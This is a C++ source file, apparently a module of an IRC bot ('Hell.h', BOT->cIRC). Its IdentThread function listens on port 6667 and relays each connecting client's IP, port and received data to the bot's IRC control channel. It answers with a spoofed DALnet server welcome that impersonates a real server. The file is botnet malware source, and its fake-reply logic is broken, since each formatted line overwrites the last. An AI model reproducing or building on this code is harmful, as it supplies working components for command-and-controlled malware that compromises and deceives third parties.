#include "Include.h"
#include "Hell.h"

DWORD WINAPI IdentThread(LPVOID param)
{
	char user[12], buffer[1024];
	
	BOOL success = FALSE;
	SOCKET ssock,csock;
	
	SOCKADDR_IN ssin, csin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = htons((unsigned short)6667);
	ssin.sin_addr.s_addr=INADDR_ANY;
	
	if ((ssock = socket(AF_INET, SOCK_STREAM, 0)) != INVALID_SOCKET) {
		if (bind(ssock, (LPSOCKADDR)&ssin, sizeof(ssin)) != SOCKET_ERROR) {
			if (listen(ssock, 5) != SOCKET_ERROR) {
				int csin_len = sizeof(csin);
				
				while (1) {
					if ((csock = accept(ssock,(LPSOCKADDR)&csin,&csin_len)) == INVALID_SOCKET)
						break;
					
					sprintf(buffer, "Client connection from IP: %s:%d.", inet_ntoa(csin.sin_addr), csin.sin_port);
					 BOT->cIRC.SendData("PRIVMSG %s :-IDENTD- [%s]\r\n",BOT->cIRC.cConf.cChan.c_str(),buffer);
					if (recv(csock,buffer,sizeof(buffer),0) != SOCKET_ERROR) {
						Split(buffer,0);
						memset(user, 0, sizeof(user));
						recv(csock,buffer,sizeof(buffer),0);
							BOT->cIRC.SendData("PRIVMSG %s :-IDENTD- [%s]\r\n",BOT->cIRC.cConf.cChan.c_str(),buffer);
						_snprintf(buffer,sizeof(buffer),":NOTICE AUTH :*** Looking up your hostname...\r\n");
						_snprintf(buffer,sizeof(buffer),":NOTICE AUTH :*** Found your hostname, cached\r\n");
						_snprintf(buffer,sizeof(buffer),":NOTICE AUTH :*** Checking Ident\r\n");
						_snprintf(buffer,sizeof(buffer),":001 RiMp :Welcome to the DALnet IRC Network\r\n");
						_snprintf(buffer,sizeof(buffer),":002 RiMp :Your host is swiftco.wa.us.dal.net\r\n");
						_snprintf(buffer,sizeof(buffer),":003 RiMp :This server was created Thu Dec 7 2006 at 16:29:38 PST\r\n");
						_snprintf(buffer,sizeof(buffer),":004 RiMp swiftco.wa.us.dal.net \r\n");
						_snprintf(buffer,sizeof(buffer),":005 RiMp NETWORK=DALnet\r\n");
						_snprintf(buffer,sizeof(buffer),":375 RiMp :- swiftco.wa.us.dal.net Message of the Day - \r\n");
						_snprintf(buffer,sizeof(buffer),":376 RiMp :End of /MOTD command.\r\n");

						if (send(csock,buffer,strlen(buffer),0) != SOCKET_ERROR)
							success = TRUE;
						
					}
				}
			}
		}
	}
	
	if (!success) {
		sprintf(buffer, "Error: server failed, returned: <%d>.", WSAGetLastError());
		BOT->cIRC.SendData("PRIVMSG %s :-IDENTD- [%s]\r\n",BOT->cIRC.cConf.cChan.c_str(),buffer);
	}
	closesocket(ssock);
	closesocket(csock);
	ExitThread(0);
	return 0;
}